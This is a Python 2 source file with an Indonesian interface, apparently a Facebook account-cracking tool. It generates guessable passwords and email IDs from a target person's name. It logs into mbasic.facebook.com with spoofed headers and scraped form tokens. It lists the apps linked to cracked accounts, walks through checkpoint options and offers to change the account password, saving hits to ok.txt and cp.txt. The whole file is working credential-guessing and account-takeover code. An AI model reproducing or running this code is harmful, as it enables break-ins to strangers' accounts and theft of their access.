def sandi_dev():
    global pw_new
    print h + '\n [' + p + '@' + h + ']' + p + ' Contoh Sandi Manual: ' + k + 'anjing,kintil,ganteng'
    san = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Input Sandi Manual?' + d + 'ENTER>Skip' + h + ': ')
    sandi_bawaan_koma = 'name123,name12345'
    sandi_bawaan_spasi = 'name123 name12345'
    while True:
        print h + '\n [' + p + '@' + h + ']' + p + ' Contoh: ' + k + '123,1234,12345'
        angka = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Tambahkan Angka Dibelakang Nama' + h + ': ')
        if len(angka) != 0:
            angka_ = angka.split(',')
            for dev in angka_:
                angka_nama.append(dev)

            break

    while True:
        print panah
        print h + ' [' + k + '1' + h + ']' + p + ' FirstName+LastName FullName'
        print h + ' [' + k + '2' + h + ']' + p,
        for dev in angka_nama:
            print 'FirstName' + k + dev,

        print 'FullName'
        print h + ' [' + k + '3' + h + ']' + p,
        for dev in angka_nama:
            print p + 'FirstName+LastName' + k + dev,

        print 'FirstName+LastName FullName'
        print h + ' [' + k + '4' + h + ']' + p,
        for dev in angka_nama:
            print p + 'FirstName' + k + dev,

        for dev in angka_nama:
            print p + 'FirstName+LastName' + k + dev,

        print 'FirstName+LastName FullName'
        print panah
        pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Pilih Kombinasi Sandi' + h + ': ')
        if pil == '1':
            pilih.append('1')
            break
        elif pil == '2':
            pilih.append('2')
            break
        elif pil == '3':
            pilih.append('3')
            break
        elif pil == '4':
            pilih.append('4')
            break

    if len(ttl__) != 0:
        while True:
            print panah
            pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Tambahkan Sandi TTL?' + a + '[y/n]' + h + ': ')
            if 'y' in pil or 'Y' in pil:
                san_ttl.append('Dev')
                break
            elif 'n' in pil or 'N' in pil:
                break

    while True:
        print panah
        pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Munculkan ' + k + 'OPSI SESI ?' + a + '[y/n]' + h + ': ')
        if 'y' in pil or 'Y' in pil:
            sesi.append('Dev')
            break
        elif 'n' in pil or 'N' in pil:
            break

    if len(sesi) != 0:
        while True:
            print panah
            pil_pw = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Ubah Sandi Akun' + a + ' Tap Yes' + k + ' [y/n]' + h + ': ')
            if pil_pw == 'y' or pil_pw == 'Y':
                pw_tap.append('IqbalDev')
                break
            elif 'n' == pil_pw or 'N' == pil_pw:
                pw_new = ''
                break

    if len(pw_tap) != 0:
        while True:
            print panah
            print h + ' [' + p + '@' + h + ']' + p + ' Contoh: ' + k + 'anjing'
            pw_new = raw_input(h + ' [' + p + '?' + h + ']' + p + 'Masukkan Sandi untuk ubah Sandi Akun' + a + ' Tap Yes' + h + ': ')
            if len(pw_new) < 6:
                print m + ' Minimal 6 Karakter..'
            else:
                break

    if ',' in san:
        san_ = san.split(',')
        tampak = sandi_bawaan_koma + ',' + san
    else:
        if ' ' in san:
            san_ = san.split(' ')
            tampak = sandi_bawaan_spasi + ' ' + san
        else:
            san_ = san.split()
            tampak = sandi_bawaan_koma + ',' + san
        for dev in san_:
            if len(dev) >= 6:
                san_manual.append(dev)
            elif len(dev) == 3 or len(dev) == 4 or len(dev) == 5:
                san_manual.append(dev + '123')

    if len(san_manual) != 0:
        print h + '\n [' + p + '*' + h + ']' + p + ' Jika diGabung: ' + k + tampak
        sandi = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Gabungkan Sandi Manual dan Bawaan?' + a + '[y/n]' + h + ': ')
        if 'y' in sandi or 'Y' in sandi:
            sandi_gabung.append('IqbalDev')
            print h + '\n [' + p + '*' + h + ']' + p + ' Menggabungkan Sandi Manual dan Bawaan' + a + ' >_<'
        else:
            gak_gabung.append('IqbalDev')
            print h + '\n [' + p + '*' + h + ']' + p + ' Tidak Menggabungkan Dengan Sandi Bawaan' + m + ' X'
 
#protol   
user_id = []

def pencarian_pro():
    global ttl__
    ttl__ = []
    nama = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Cari Orang' + h + ': ')
    while True:
        try:
            if y != z:
                break
            print h + '\n [' + k + '1' + h + ']' + p + ' @email.com' + a + ' Pro'
            print h + ' [' + k + '2' + h + ']' + p + ' @gmail.com'
            print h + ' [' + k + '3' + h + ']' + p + ' @yahoo.com'
            print garis
            pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Pilih Domain' + h + ': ')
            if pil == '1':
                domain = '@email.com'
                break
            elif pil == '2':
                domain = '@gmail.com'
                break
            elif pil == '3':
                domain = '@yahoo.com'
                break
        except:
            break

    jml = input(h + ' [' + p + '$' + h + ']' + p + ' Masukkan Jumlah' + k + ': ' + p)
    nam = nama.split()
    if len(nam) == 2:
        for dev in range(1, (jml + 1) / 2 + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam[0]) + str(dev) + domain + ' ' + str(nam[0]))
                user_id.append(str(nam[0] + nam[1]) + str(dev) + domain + ' ' + str(nam[0] + ' ' + str(nam[1])))
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) == 3:
        for dev in range(1, (jml + 1) / 2 + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam[0]) + str(dev) + domain + ' ' + str(nam[0]))
                user_id.append(str(nam[0] + nam[1] + nam[2]) + str(dev) + domain + ' ' + str(nam[0] + ' ' + str(nam[1] + ' ' + str(nam[2]))))
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) > 3:
        pw = nama.split()
        nam = nama.replace(' ', '')
        for dev in range(1, jml + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam) + str(dev) + domain + ' ' + str(pw[0]))
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) == 1:
        for dev in range(1, jml + 1):
            try:
                t = te.replace(te, '')
                user_id.append(nama + str(dev) + domain + ' ' + nama)
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

#def tools():    
def profcheck(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;93m\033[0;97m [\033[1;33m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;93m\033[0;97m [\033[1;33m•\033[1;37m] Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;33m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	else:
		print("%s [%s!%s] Error Login Failed!\n"%(p,m,p))


#######################################################

def results():
    global token
    cek_ok = open("ok.txt","r").read()
    cek_cp = open("cp.txt","r").read()
    print("\n %s[%s1%s] Result OK\n %s[%s2%s] Result CP\n %s[%s0%s] Back to menu"%(p,k,p,p,k,p,p,k,p))
    cek_ress = raw_input("\n \033[4;33mChoose%s:\x1b[0m\n %s➤%s➤%s➤%s➤ %s"%(p,m,k,h,b,p))
    if cek_ress in ["1","01"]:
        if len(cek_ok) != 0:
            print("\n %s[%s Results ok %s]%s\n"%(b,p,k,p));os.system("cat ok.txt")
        else:
            print("\n %s[%s!%s] No Result !"%(p,m,p));time.sleep(3);results()
    elif cek_ress in ["2","02"]:
        if len(cek_cp) != 0:
            print("\n %s[%s Results cp %s]%s\n"%(k,p,k,p));os.system("cat cp.txt")
        else:
            print("\n %s[%s!%s] No Result !"%(p,m,p));time.sleep(3);results()
    elif cek_ress in ["0","00"]:
        menu()
    else: 
        exit("\n%s [%s!%s] pilih cok!"%(p,m,p))

def setting():
    global token
    print("\n%s [%s1%s] Setting user agent\n %s[%s2%s] Cek user agent\n %s[%s3%s] Back"%(p,k,p,p,k,p,p,k,p))
    cek_prof = raw_input("\n \033[4;33mChoose%s:\x1b[0m\n %s➤%s➤%s➤%s➤ %s"%(p,m,k,h,b,p))
    if cek_prof in ["1","01"]:
        user_prof = raw_input("\n%s [%s•%s] Input user agent\n %s[%s•%s] User agent: "%(p,k,p,p,k,p))
        print("%s [%s•%s] Please Wait!"%(p,k,p));time.sleep(1.5)
        open("ua","w").write(user_prof)
        print("%s [%s•%s] Berhasil set user agent"%(p,k,p))
        raw_input("%s [%sBack%s]"%(p,k,p))
        menu()
    elif cek_prof in ["2","02"]:
        try:
            ua = open("ua", "r").read()
        except IOError:
            ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
        print("\n%s [%s•%s] User agent saat ini : %s%s"%(p,k,p,h,ua))
        raw_input("\n\n %s[ %sBACK%s ]"%(p,k,p))
        menu()
    elif cek_prof in ["3","03"]:  
        menu()   


def cek_folder_ok_cp():
    try:
        open("ok.txt","r").read()
    except Exception as e:
        os.system("touch ok.txt")
    try:
        open("cp.txt","r").read()
    except Exception as e:
        os.system("touch cp.txt")
        


if __name__=="__main__":
    #os.system("git pull")
    os.system("touch login.txt")
    cek_folder_ok_cp()
    menu()
